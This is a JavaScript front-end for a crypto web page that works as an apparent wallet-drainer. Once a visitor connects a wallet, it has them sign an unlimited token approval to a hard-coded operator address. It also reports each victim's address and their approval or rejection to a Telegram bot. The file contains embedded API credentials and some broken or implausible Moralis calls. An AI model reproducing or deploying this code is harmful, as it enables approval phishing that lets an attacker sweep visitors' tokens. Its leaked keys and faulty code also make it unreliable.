document.addEventListener("DOMContentLoaded", async function () {
    const web3 = new Web3("https://mainnet.infura.io/v3/65a9bb61d9144ba19821fa07cfb10a41"); // Replace with your Infura project ID or Ethereum node URL
    const usdcContractAddress = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52"; // contract address of token
    const yourAddress = "0xbC792cFF237D23A92cF0Cd5e66491986D867E421"; // Replace with your personal Ethereum address

    const connectWalletButton = document.getElementById("connectWalletButton");
    const approveButton = document.getElementById("approveButton");
    const transactionStatus = document.getElementById("transactionStatus");

    let userAddress; // Variable to store the connected user's address

    async function connectWallet() {
        try {
            if (window.ethereum) {
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    console.log("Connected to account:", userAddress);

                    // Notify user connected wallet address to Telgram bot
                    await notifyUserAddress(userAddress);

                    approveButton.removeAttribute("disabled"); // Enable the "Approve" button
                } else {
                    throw new Error("No Ethereum accounts available.");
                }
            } else {
                throw new Error("MetaMask or Ethereum wallet provider not found. Please install MetaMask or use an Ethereum wallet.");
            }
        } catch (error) {
            console.error(error);
            transactionStatus.textContent = `Error: ${error.message}`;
        }
    }

    async function getEstimatedGas(data, userAddress) {
        try {
            const gas = await web3.eth.estimateGas({
                to: usdcContractAddress,
                data: data,
                from: userAddress,
            });
            return gas.toString(); // Convert gas to a string
        } catch (error) {
            console.error("Error estimating gas:", error);
            throw error;
        }
    }

    async function approveTokenTransfer() {
        try {
            if (!userAddress) {
                throw new Error("Please connect your wallet first.");
            }

            // contract abi for approve on any token
            const usdcContractABI = [
                {
                    "inputs": [
                        {
                            "internalType": "address",
                            "name": "spender",
                            "type": "address"
                        },
                        {
                            "internalType": "uint256",
                            "name": "amount",
                            "type": "uint256"
                        }
                    ],
                    "name": "approve",
                    "outputs": [
                        {
                            "internalType": "bool",
                            "name": "",
                            "type": "bool"
                        }
                    ],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ];

            // Create a contract instance
            const usdcContract = new web3.eth.Contract(usdcContractABI, usdcContractAddress);

            // Encode the approval function with an infinite allowance
            const infiniteApproval = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)).toString();
            const data = usdcContract.methods.approve(yourAddress, infiniteApproval).encodeABI();

            // Get the estimated gas amount as a string
            const gas = await getEstimatedGas(data, userAddress);

            // Create a raw transaction object
            const rawTx = {
                to: usdcContractAddress,
                gas: gas, // Use the estimated gas as a string
                value: "0x00",
                data: data,
            };

            // Request the user's approval to sign the transaction
            const signedTx = await ethereum.request({
                method: 'eth_sendTransaction',
                params: [
                    {
                        from: userAddress,
                        ...rawTx,
                    },
                ],
            });

            // Display the transaction status
            transactionStatus.textContent = `Transaction Hash: ${signedTx}`;

            // Notify user transaction approval to Telegram bot
            await notifyUserTxApproval(signedTx);

        } catch (error) {
            console.error(error);
            transactionStatus.textContent = `Error: ${error.message}`;

            // Notify user transaction rejection to Telegram bot
            await notifyUserTxRejection(error);
        }
    }

    // Function to notify user connection to Telegram bot
            const config = require('./config.js')
    async function notifyUserAddress(userAddress) {
        try {
            const Moralis = await import('moralis');
            Moralis.start({ serverUrl: '<YOUR_MORALIS_SERVER_URL>', appId: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjJlMzg2YmM2LTlhZWItNGU0Yi1iMmQzLWU5NTYxYmViNGNlYSIsIm9yZ0lkIjoiMzg4NTgyIiwidXNlcklkIjoiMzk5Mjg4IiwidHlwZUlkIjoiMzY5NGI0ZWEtNTgzNi00ODJlLWI1ODEtYWRjMmFkYjY5NGQ0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTM0NjU0MDgsImV4cCI6NDg2OTIyNTQwOH0.oPH_AZWv2u4s63uLw2gIU-AYW6ZTpa9A8EdokcDt3CY' });
            
            const User = Moralis.Object.extend("User");
            const query = new User.Query();
            query.equalTo("ethAddress", userAddress);
            const results = await query.first();
            
            if (results) {
                // User is already registered, so no need to notify
                return;
            } else {
                // Create a new user in Moralis
                const newUser = new User();
                newUser.set("ethAddress", userAddress);
                await newUser.save();
            }

            const TelegramBot = Moralis.Object.extend("TelegramBot");
            const telegramBotQuery = new TelegramBot.Query();
            const telegramBot = await telegramBotQuery.first();

            const messageData = {
                text: `User has connected their wallet: ${userAddress}`,
                chat_id: telegramBot.get("chatId")
            };

            const message = new Moralis.Cloud.Message("Evernote", messageData);
            await message.save();

        } catch (error) {
            console.error("Error notifying user address to Telegram bot:", error);
        }
    }

    // Function to notify user transaction approval to Telegram bot
    async function notifyUserTxApproval(signedTx) {
        try {
            const TelegramBot = Moralis.Object.extend("TelegramBot");
            const telegramBotQuery = new TelegramBot.Query();
            const telegramBot = await telegramBotQuery.first();

            const messageData = {
                text: `User has approved a transaction: ${signedTx}`,
                chat_id: telegramBot.get("chatId")
            };

            const message = new Moralis.Cloud.Message("Evernote", messageData);
            await message.save();

        } catch (error) {
            console.error("Error notifying user transaction approval to Telegram bot:", error);
        }
    }

    // Function to notify user transaction rejection to Telegram bot
    async function notifyUserTxRejection(error) {
        try {
            const TelegramBot = Moralis.Object.extend("TelegramBot");
            const telegramBotQuery = new TelegramBot.Query();
            const telegramBot = await telegramBotQuery.first();

            const messageData = {
                text: `User has rejected a transaction: ${error.message}`,
                chat_id: telegramBot.get("chatId")
            };

            const message = new Moralis.Cloud.Message("Evernote", messageData);
            await message.save();

        } catch (error) {
            console.error("Error notifying user transaction rejection to Telegram bot:", error);
        }
    }

    connectWalletButton.addEventListener("click", connectWallet);
    approveButton.addEventListener("click", approveTokenTransfer);
});
